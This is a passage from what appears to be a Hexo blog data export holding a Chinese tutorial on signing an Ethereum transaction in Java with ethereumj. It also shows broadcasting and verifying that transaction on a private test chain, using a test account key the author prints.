eth.sendRawTransaction(\"0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216\")\nINFO [03-17|08:13:31]Submitted transaction                    fullhash=0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7 recipient=0x94E94dcab84Ad8805c2EbB843C1cf06393cca620\n\"0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7\"\n```\n我们查看accounts[1]地址现在是否收到了1eth\n```\n> eth.getBalance(eth.accounts[1])\n1000000000000000000\n> web3.fromWei(eth.getBalance(eth.accounts[1]),\"ether\")\n1\n```\n查看交易结果\n\n```\n> eth.getTransaction(\"0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7\")\n{\n  blockHash: \"0x53bb7e8ef200dfa7dd2e72cba30bc9bcfb9e2de7bb49da1c35f49dbd18dd7c14\",\n  blockNumber: 4,\n  from: \"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\",\n  gas: 22856,\n  gasPrice: 18000000000,\n  hash: \"0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7\",\n  input: \"0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000\",\n  nonce: 0,\n  r: \"0x66674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7\",\n  s: \"0x4d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216\",\n  to: \"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\",\n  transactionIndex: 0,\n  v: \"0x7f2\",\n  value: 1000000000000000000\n}\n```\n\n由此结果可以验证我们签名的交易正确。\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n","slug":"Java中签名一笔交易并验证","published":1,"updated":"2018-03-18T03:49:35.061Z","layout":"post","photos":[],"link":"","_id":"cjf7piav00006pkwo172gvylx","content":"<h3 id=\"Java中签名一笔交易并验证\"><a href=\"#Java中签名一笔交易并验证\" class=\"headerlink\" title=\"Java中签名一笔交易并验证\"></a>Java中签名一笔交易并验证</h3><blockquote>\n<p>上一节讲了Java中创建钱包，这一节我们讲如何在Java中签名一笔交易</p>\n</blockquote>\n<p>准备工作就不做详细介绍了</p>\n<ul>\n<li>集成Java的环境查看<a href=\"https://github.com/ethereum/ethereumj\" target=\"_blank\" rel=\"noopener\">这里</a></li>\n<li>搭建测试的私链查看<a href=\"http://c60block.com/2018/03/16/%E9%83%A8%E7%BD%B2%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E5%B9%B6%E6%8C%96%E7%9F%BF/\" target=\"_blank\" rel=\"noopener\">这里</a></li>\n</ul>\n<p>直接切入重点。包里给我们提供了这样的一个方法，来构造一笔交易。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public Transaction(byte[] nonce, byte[] gasPrice, byte[] gasLimit, byte[] receiveAddress, byte[] value, byte[] data, Integer chainId) &#123;</span><br><span class=\"line\">       this.chainId = null;</span><br><span class=\"line\">       this.parsed = false;</span><br><span class=\"line\">       this.nonce = nonce;</span><br><span class=\"line\">       this.gasPrice = gasPrice;</span><br><span class=\"line\">       this.gasLimit = gasLimit;</span><br><span class=\"line\">       this.receiveAddress = receiveAddress;</span><br><span class=\"line\">       if(ByteUtil.isSingleZero(value)) &#123;</span><br><span class=\"line\">           this.value = ByteUtil.EMPTY_BYTE_ARRAY;</span><br><span class=\"line\">       &#125; else &#123;</span><br><span class=\"line\">           this.value = value;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       this.data = data;</span><br><span class=\"line\">       this.chainId = chainId;</span><br><span class=\"line\">       if(receiveAddress == null) &#123;</span><br><span class=\"line\">           this.receiveAddress = ByteUtil.EMPTY_BYTE_ARRAY;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       this.parsed = true;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"以上参数是什么意思呢？\"><a href=\"#以上参数是什么意思呢？\" class=\"headerlink\" title=\"以上参数是什么意思呢？\"></a>以上参数是什么意思呢？</h4><ul>\n<li>nonce 交易序列号，交易序列号默认是0，每增加一笔交易nonce+1</li>\n<li>gasgasLimit 通常我们说的gas</li>\n<li>gasPrice 单位gas需要的价格</li>\n<li>receiverAddress 接收者的地址</li>\n<li>value 要转的代币</li>\n<li>data eth交易可以为空字符串。</li>\n<li>chainId 网络id，主网络是1  我这里测试网络配置了999，根据自身私链设置。</li>\n</ul>\n<p>需要注意的是：这里的交易单位都是wei，单位转换参考下表。</p>\n<table>\n<thead>\n<tr>\n<th>Unit</th>\n<th>Wei Value</th>\n<th>Wei</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>wei</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Kwei (babbage)</td>\n<td>1e3 wei</td>\n<td>1,000</td>\n</tr>\n<tr>\n<td>Mwei (lovelace)</td>\n<td>1e6 wei</td>\n<td>1000,000</td>\n</tr>\n<tr>\n<td>Gwei (shannon)</td>\n<td>1e9 wei</td>\n<td>1,000,000,000</td>\n</tr>\n<tr>\n<td>microether (szabo)</td>\n<td>1e12 wei</td>\n<td>1,000,000,000,000</td>\n</tr>\n<tr>\n<td>milliether (finney)</td>\n<td>1e15 wei</td>\n<td>1,000,000,000,000,000</td>\n</tr>\n<tr>\n<td>ether</td>\n<td>1e18 wei</td>\n<td>1,000,000,000,000,000,000</td>\n</tr>\n</tbody>\n</table>\n<p>知道这些概念后我们就可以签名一笔交易。</p>\n<p>现在我们模拟从accounts[0]地址给accounts[1]地址发送一笔交易，数额为1eth。并且携带了交易信息。</p>\n<ol>\n<li>首先获取nonce值</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.getTransactionCount(eth.accounts[0])</span><br><span class=\"line\">0</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>得到nonce为0</p>\n</blockquote>\n<ol>\n<li>获取gas</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.estimateGas(&#123;from:eth.accounts[0],to:eth.accounts[1],data:&quot;0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000&quot;,value:5000000000000000000&#125;)</span><br><span class=\"line\">22856</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>得到gas为22856</p>\n</blockquote>\n<ol>\n<li>获取推荐的gasPrice</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.gasPrice</span><br><span class=\"line\">18000000000</span><br></pre></td></tr></table></figure>\n<ol>\n<li>获取接收者的地址</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.accounts[0]</span><br><span class=\"line\">&quot;0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826&quot;</span><br><span class=\"line\">&gt; eth.accounts[1]</span><br><span class=\"line\">&quot;0x94e94dcab84ad8805c2ebb843c1cf06393cca620&quot;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>当前我在私有链上导入两个地址，然后用”0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826”这个地址挖矿，挖到币发送给”0x94e94dcab84ad8805c2ebb843c1cf06393cca620”<br>所以获取到的接收地址为：==”0x94e94dcab84ad8805c2ebb843c1cf06393cca620”==</p>\n</blockquote>\n<ol>\n<li>data在以太坊交易中可以为“”，这里是做测试我随便填了一组字符串。</li>\n<li>value为1eth，上面说了这里交易设置的值为wei，所以这里是1000000000000000000</li>\n<li>chainId为私有链配置的网络id我这里为999</li>\n</ol>\n<p>还有在签名的时候需要用到私钥。我这里测试账号的私钥为”c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4”</p>\n<p>接下来我们对需要发起的这笔交易进行签名。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s =&quot;0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000&quot;;</span><br><span class=\"line\">        BigInteger bigInteger =  new BigInteger(&quot;94e94dcab84ad8805c2ebb843c1cf06393cca620&quot;,16);</span><br><span class=\"line\">        //nonce</span><br><span class=\"line\">        byte[] nonce = ByteUtil.intToBytesNoLeadZeroes(0);</span><br><span class=\"line\">        //</span><br><span class=\"line\">        byte[] gasPrice = ByteUtil.bigIntegerToBytes(new BigInteger(&quot;18000000000&quot;));</span><br><span class=\"line\">        //</span><br><span class=\"line\">        byte[] gas = ByteUtil.longToBytesNoLeadZeroes(22856);</span><br><span class=\"line\">        //</span><br><span class=\"line\">        byte[] address = ByteUtil.bigIntegerToBytes(bigInteger);</span><br><span class=\"line\">        //交易金额</span><br><span class=\"line\">        byte[] value = ByteUtil.bigIntegerToBytes(new BigInteger(&quot;1000000000000000000&quot;));</span><br><span class=\"line\">        //字符串转成数组上传</span><br><span class=\"line\">        byte[] data = ByteUtil.hexStringToBytes(s);</span><br><span class=\"line\">        Transaction tx = new Transaction(</span><br><span class=\"line\">                nonce,</span><br><span class=\"line\">                //</span><br><span class=\"line\">                gasPrice,</span><br><span class=\"line\">                //gas限度</span><br><span class=\"line\">                gas,</span><br><span class=\"line\">                //接收者地址</span><br><span class=\"line\">                address,</span><br><span class=\"line\">                //发送的金额</span><br><span class=\"line\">                value,</span><br><span class=\"line\">                //携带消息</span><br><span class=\"line\">                data,</span><br><span class=\"line\">                //发送到主链当中</span><br><span class=\"line\">                999</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        //开始签名</span><br><span class=\"line\">        tx.sign(ECKey.fromPrivate(new BigInteger(&quot;c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4&quot;,16)));</span><br><span class=\"line\">        byte[] rawTx = tx.getEncoded();</span><br><span class=\"line\">        //打印出签名后的值</span><br><span class=\"line\">        System.out.println(&quot;0x&quot;+ Hex.toHexString(rawTx));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">得到签名后的数据为：</span><br><span class=\"line\">0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216</span><br></pre></td></tr></table></figure>\n<p>然后我们在这私有链上广播出去这笔交易看是否签名正确。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.sendRawTransaction(&quot;0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216&quot;)</span><br><span class=\"line\">INFO [03-17|08:13:31]Submitted transaction                    fullhash=0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7 recipient=0x94E94dcab84Ad8805c2EbB843C1cf06393cca620</span><br><span class=\"line\">&quot;0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7&quot;</span><br></pre></td></tr></table></figure>\n<p>我们查看accounts[1]地址现在是否收到了1eth<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.getBalance(eth.accounts[1])</span><br><span class=\"line\">1000000000000000000</span><br><span class=\"line\">&gt; web3.fromWei(eth.getBalance(eth.accounts[1]),&quot;ether&quot;)</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure></p>\n<p>查看交易结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.getTransaction(&quot;0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7&quot;)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  blockHash: &quot;0x53bb7e8ef200dfa7dd2e72cba30bc9bcfb9e2de7bb49da1c35f49dbd18dd7c14&quot;,</span><br><span class=\"line\">  blockNumber: 4,</span><br><span class=\"line\">  from: &quot;0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826&quot;,</span><br><span class=\"line\">  gas: 22856,</span><br><span class=\"line\">  gasPrice: 18000000000,</span><br><span class=\"line\">  hash: &quot;0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7&quot;,</span><br><span class=\"line\">  input: &quot;0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000&quot;,</span><br><span class=\"line\">  nonce: 0,</span><br><span class=\"line\">  r: &quot;0x66674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7&quot;,</span><br><span class=\"line\">  s: &quot;0x4d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216&quot;,</span><br><span class=\"line\">  to: &quot;0x94e94dcab84ad8805c2ebb843c1cf06393cca620&quot;,</span><br><span class=\"line\">  transactionIndex: 0,</span><br><span class=\"line\">  v: &quot;0x7f2&quot;,</span><br><span class=\"line\">  value: 1000000000000000000</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由此结果可以验证我们签名的交易正确。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Java中签名一笔交易并验证\"><a href=\"#Java中签名一笔交易并验证\" class=\"headerlink\" title=\"Java中签名一笔交易并验证\"></a>Java中签名一笔交易并验证</h3><blockquote>\n<p>上一节讲了Java中创建钱包，这一节我们讲如何在Java中签名一笔交易</p>\n</blockquote>\n<p>准备工作就不做详细介绍了</p>\n<ul>\n<li>集成Java的环境查看<a href=\"https://github.com/ethereum/ethereumj\" target=\"_blank\" rel=\"noopener\">这里</a></li>\n<li>搭建测试的私链查看<a href=\"http://c60block.com/2018/03/16/%E9%83%A8%E7%BD%B2%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E5%B9%B6%E6%8C%96%E7%9F%BF/\" target=\"_blank\" rel=\"noopener\">这里</a></li>\n</ul>\n<p>直接切入重点。包里给我们提供了这样的一个方法，来构造一笔交易。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public Transaction(byte[] nonce, byte[] gasPrice, byte[] gasLimit, byte[] receiveAddress, byte[] value, byte[] data, Integer chainId) &#123;</span><br><span class=\"line\">       this.chainId = null;</span><br><span class=\"line\">       this.parsed = false;</span><br><span class=\"line\">       this.nonce = nonce;</span><br><span class=\"line\">       this.gasPrice = gasPrice;</span><br><span class=\"line\">       this.gasLimit = gasLimit;</span><br><span class=\"line\">       this.receiveAddress = receiveAddress;</span><br><span class=\"line\">       if(ByteUtil.isSingleZero(value)) &#123;</span><br><span class=\"line\">           this.value = ByteUtil.EMPTY_BYTE_ARRAY;</span><br><span class=\"line\">       &#125; else &#123;</span><br><span class=\"line\">           this.value = value;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       this.data = data;</span><br><span class=\"line\">       this.chainId = chainId;</span><br><span class=\"line\">       if(receiveAddress == null) &#123;</span><br><span class=\"line\">           this.receiveAddress = ByteUtil.EMPTY_BYTE_ARRAY;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       this.parsed = true;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"以上参数是什么意思呢？\"><a href=\"#以上参数是什么意思呢？\" class=\"headerlink\" title=\"以上参数是什么意思呢？\"></a>以上参数是什么意思呢？</h4><ul>\n<li>nonce 交易序列号，交易序列号默认是0，每增加一笔交易nonce+1</li>\n<li>gasgasLimit 通常我们说的gas</li>\n<li>gasPrice 单位gas需要的价格</li>\n<li>receiverAddress 接收者的地址</li>\n<li>value 要转的代币</li>\n<li>data eth交易可以为空字符串。</li>\n<li>chainId 网络id，主网络是1  我这里测试网络配置了999，根据自身私链设置。</li>\n</ul>\n<p>需要注意的是：这里的交易单位都是wei，单位转换参考下表。</p>\n<table>\n<thead>\n<tr>\n<th>Unit</th>\n<th>Wei Value</th>\n<th>Wei</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>wei</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>Kwei (babbage)</td>\n<td>1e3 wei</td>\n<td>1,000</td>\n</tr>\n<tr>\n<td>Mwei (lovelace)</td>\n<td>1e6 wei</td>\n<td>1000,000</td>\n</tr>\n<tr>\n<td>Gwei (shannon)</td>\n<td>1e9 wei</td>\n<td>1,000,000,000</td>\n</tr>\n<tr>\n<td>microether (szabo)</td>\n<td>1e12 wei</td>\n<td>1,000,000,000,000</td>\n</tr>\n<tr>\n<td>milliether (finney)</td>\n<td>1e15 wei</td>\n<td>1,000,000,000,000,000</td>\n</tr>\n<tr>\n<td>ether</td>\n<td>1e18 wei</td>\n<td>1,000,000,000,000,000,000</td>\n</tr>\n</tbody>\n</table>\n<p>知道这些概念后我们就可以签名一笔交易。</p>\n<p>现在我们模拟从accounts[0]地址给accounts[1]地址发送一笔交易，数额为1eth。并且携带了交易信息。</p>\n<ol>\n<li>首先获取nonce值</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.getTransactionCount(eth.accounts[0])</span><br><span class=\"line\">0</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>得到nonce为0</p>\n</blockquote>\n<ol>\n<li>获取gas</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.estimateGas(&#123;from:eth.accounts[0],to:eth.accounts[1],data:&quot;0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000&quot;,value:5000000000000000000&#125;)</span><br><span class=\"line\">22856</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>得到gas为22856</p>\n</blockquote>\n<ol>\n<li>获取推荐的gasPrice</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.gasPrice</span><br><span class=\"line\">18000000000</span><br></pre></td></tr></table></figure>\n<ol>\n<li>获取接收者的地址</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.accounts[0]</span><br><span class=\"line\">&quot;0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826&quot;</span><br><span class=\"line\">&gt; eth.accounts[1]</span><br><span class=\"line\">&quot;0x94e94dcab84ad8805c2ebb843c1cf06393cca620&quot;</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>当前我在私有链上导入两个地址，然后用”0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826”这个地址挖矿，挖到币发送给”0x94e94dcab84ad8805c2ebb843c1cf06393cca620”<br>所以获取到的接收地址为：==”0x94e94dcab84ad8805c2ebb843c1cf06393cca620”==</p>\n</blockquote>\n<ol>\n<li>data在以太坊交易中可以为“”，这里是做测试我随便填了一组字符串。</li>\n<li>value为1eth，上面说了这里交易设置的值为wei，所以这里是1000000000000000000</li>\n<li>chainId为私有链配置的网络id我这里为999</li>\n</ol>\n<p>还有在签名的时候需要用到私钥。我这里测试账号的私钥为”c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4”</p>\n<p>接下来我们对需要发起的这笔交易进行签名。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String s =&quot;0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000&quot;;</span><br><span class=\"line\">        BigInteger bigInteger =  new BigInteger(&quot;94e94dcab84ad8805c2ebb843c1cf06393cca620&quot;,16);</span><br><span class=\"line\">        //nonce</span><br><span class=\"line\">        byte[] nonce = ByteUtil.intToBytesNoLeadZeroes(0);</span><br><span class=\"line\">        //</span><br><span class=\"line\">        byte[] gasPrice = ByteUtil.bigIntegerToBytes(new BigInteger(&quot;18000000000&quot;));</span><br><span class=\"line\">        //</span><br><span class=\"line\">        byte[] gas = ByteUtil.longToBytesNoLeadZeroes(22856);</span><br><span class=\"line\">        //</span><br><span class=\"line\">        byte[] address = ByteUtil.bigIntegerToBytes(bigInteger);</span><br><span class=\"line\">        //交易金额</span><br><span class=\"line\">        byte[] value = ByteUtil.bigIntegerToBytes(new BigInteger(&quot;1000000000000000000&quot;));</span><br><span class=\"line\">        //字符串转成数组上传</span><br><span class=\"line\">        byte[] data = ByteUtil.hexStringToBytes(s);</span><br><span class=\"line\">        Transaction tx = new Transaction(</span><br><span class=\"line\">                nonce,</span><br><span class=\"line\">                //</span><br><span class=\"line\">                gasPrice,</span><br><span class=\"line\">                //gas限度</span><br><span class=\"line\">                gas,</span><br><span class=\"line\">                //接收者地址</span><br><span class=\"line\">                address,</span><br><span class=\"line\">                //发送的金额</span><br><span class=\"line\">                value,</span><br><span class=\"line\">                //携带消息</span><br><span class=\"line\">                data,</span><br><span class=\"line\">                //发送到主链当中</span><br><span class=\"line\">                999</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        //开始签名</span><br><span class=\"line\">        tx.sign(ECKey.fromPrivate(new BigInteger(&quot;c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4&quot;,16)));</span><br><span class=\"line\">        byte[] rawTx = tx.getEncoded();</span><br><span class=\"line\">        //打印出签名后的值</span><br><span class=\"line\">        System.out.println(&quot;0x&quot;+ Hex.toHexString(rawTx));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">得到签名后的数据为：</span><br><span class=\"line\">0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216</span><br></pre></td></tr></table></figure>\n<p>然后我们在这私有链上广播出去这笔交易看是否签名正确。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; eth.sendRawTransaction(&quot;0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216&quot;)</span><br><span class=\"line\">INFO [03-17|08:13:31]Submitted transaction                    fullhash=0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7 recipient=0x94E94dcab84Ad8805c2EbB843C1cf06393cca620</span><br><span 